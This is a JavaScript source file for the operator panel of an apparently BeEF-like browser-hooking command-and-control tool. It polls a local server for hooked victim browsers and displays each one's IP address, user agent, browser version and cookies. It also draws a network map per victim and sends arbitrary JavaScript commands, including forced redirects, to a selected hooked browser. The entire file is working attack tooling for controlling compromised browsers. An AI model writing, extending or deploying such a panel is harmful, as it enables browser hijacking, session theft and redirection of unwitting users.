/*
var xhr;
if(window.XMLHttpRequest){
	xhr=new XMLHttpRequest();
}else if (window.Active.Object) {
	xhr= new ActiveObject("MSxml12.XMLHTTP")
}

function MakeRequest(url) {
	if (xhr!=null) {
		xhr.onreadystatechange=StateChange;
		xhr.open("GET",url,true);
		xhr.send();
	}
}

function create_list(json_tree){
	var ua = document.createTextNode(json_tree.0.ua);
	var hook_id  = document.createTextNode(json_tree.0.hook_id);
	var vic=document.createElement("li");
	vic.appendChild(ua);

	var ul2 = document.createElement('ul');
	var li2 = document.createElement('li');
	li2.appendChild(hook_id);
	ul2.appendChild(li2);

	vic.appendChild(ul2);
	document.getElementById('hook_list').appendChild(vic);
}

function StateChange(){
	if(xhr.readyState==4 && xhr.status==200){
		if (xhr.responseText!=null) {
			var json_tree = xhr.responseText;
//			hook_id_array = document.getElementById(hook_list)
//			create_list(json_tree);
			console.log(json_tree)

		}
	}
}

setInterval('MakeRequest("http://127.0.0.1:8000/hook_tree")',8000);
*/

var json_data;

function JSONLength(obj) {
	var size = 0, key;
	for (key in obj) {
	if (obj.hasOwnProperty(key)) size++;
	}
	return size;
};


function GetTree(){
	$.getJSON('http://127.0.0.1:8000/hook_tree',function (data){
		var zTreeObj,
		setting = {
			view: {
				selectedMulti: false
			},
			callback: {
				onClick: zTreeOnClick
			},

		},
		zTreeNodes = [
			{"name":"online", open:true, children: [
//				{ "name":data.hook0.host, "url":"http://g.cn", "target":"_blank"},
				]
			}
		];
		
		json_data=data;

		for(var i=0;i<JSONLength(data);i++){
			zTreeNodes[0].children.push({ "name":data["hook"+String(i)].IP.split(" or ")[0], 
				"url":"","treeId":"hook"+String(i),
			});
		}

		$(document).ready(function(){
			zTreeObj = $.fn.zTree.init($("#tree"), setting, zTreeNodes);
		});

		function zTreeOnClick(event, treeId, treeNode) {
    		//alert(treeNode.tId + ", " + treeNode.name);
    		ClearPic();
    		$("#ip").html(data[treeNode.treeId].IP);
    		$("#ua").html(data[treeNode.treeId].ua);
    		$("#hook_id").html(data[treeNode.treeId].hook_id);
    		$("#browser_version").html(data[treeNode.treeId].browser_version);
    		$("#victim_cookie").html(data[treeNode.treeId].cookies)
    		Draw_network(treeNode.treeId);
		}
	
	});
}

setInterval(GetTree,4000);

function ClearPic(){
	var canvas = document.getElementById("net_map");
	var ctx = canvas.getContext("2d");
	ctx.clearRect(0, 0, 800,800);
}

function Draw_network(tree_Id){
$(document).ready(function(){
		var canvas = document.getElementById("net_map");
		var ctx = canvas.getContext("2d");

		var startx = 100;
		var starty = 100;
/*
		var beef = new Image();
		beef.src="beef.jpg";
		beef.onload = function(){
			ctx.drawImage(beef,startx,starty,picxy,picxy);
			ctx.beginPath();
			linex = startx+picxy;
			liney = starty+Math.floor(picxy/2); 
			ctx.moveTo(linex,liney);
			ctx.lineTo(linex+80,liney);
			picstartx = linex+80;

			ctx.stroke();
		};

		var browser = new Image();
		browser.src = "IE.jpeg";
		browser.onload = function(){
			ctx.drawImage(browser,picstartx,liney-25,50,50);
			ctx.font = "12px sans-serif";
			ctx.fillText("hook browser",picstartx,liney+37);
		}
*/
		var point_x;
		var point_y; 



		function DrawPic(pic_name,start_pic_x,start_pic_y,text) {
			var pic = new Image();
			pic.src = "static/img/"+pic_name;
			pic.onload = function(){
				ctx.drawImage(pic,start_pic_x,start_pic_y,50,50);
			}
			//同时写上text
			if(text){
				ctx.font = "12px sans-serif";
				ctx.textAlign = "start";
				ctx.fillText(text,start_pic_x,start_pic_y+62);
			}
			point_x = start_pic_x+50;
			point_y = start_pic_y+25;
			//返回图片后的线节点位置			
		}

		function DrawLine(start_line_x,start_line_y,end_line_y) {
			ctx.beginPath();
			ctx.moveTo(start_line_x,start_line_y);
			ctx.lineTo(start_line_x+80,end_line_y);
			ctx.stroke();
			point_x = start_line_x+80;
			point_y = end_line_y-25;
			//将point设置成接下来的图片起始点
		}

		DrawPic("beef.jpg",startx,starty,"beef");
		DrawLine(point_x,point_y,point_y);

		DrawPic("IE.jpeg",point_x,point_y,"hook_browser");
//hook_point 就是hook浏览器后的节点，由这个节点分支

		var hook_point_x = point_x;
		var hook_point_y = point_y;

		console.log(hook_point_y);
		function DrawBranch(x,y,offset,ip){
			DrawLine(point_x,point_y,point_y+offset);
			DrawPic("net.png",point_x,point_y,ip);

			DrawLine(point_x,point_y,point_y);
			DrawPic("PC.jpeg",point_x,point_y,"PC");
			point_x = hook_point_x;
			point_y = hook_point_y;
		}
/*
		if (json_data!=null){
			for(i=0;i<JSONLength(json_data);i++){
				DrawBranch(point_x,point_y,80*i,json_data[id].IP.split[i]);
			}
		}
*/

		if(json_data!=null){
			var ip_arr = json_data[tree_Id].IP.split(' or ')
			var ip_number = ip_arr.length;
			for(i=0;i<ip_number;i++){
				DrawBranch(point_x,point_y,80*i,ip_arr[i]);
			}
		}

	});	
}


$(document).ready(function(){
	$("button#cmd_button").click(function(){
		var cmd_id = $('#hook_id').text();
		var cmd = $('#cmd').val();
		
		$.ajax({
			url:'command',
			method:"POST",
			data:{"cmd":cmd,"cmd_id":cmd_id},

		});
	});

	$("button#turn").click(function(){
		var cmd_id = $('#hook_id').text();
		var turn_addr = $('#turn_addr').val();
		console.log(turn_addr);
		turn_cmd = "location.href='"+turn_addr+"';";
		$.ajax({
			url:'command',
			method:"POST",
			data:{"cmd":turn_cmd,"cmd_id":cmd_id},

		});
	});

});







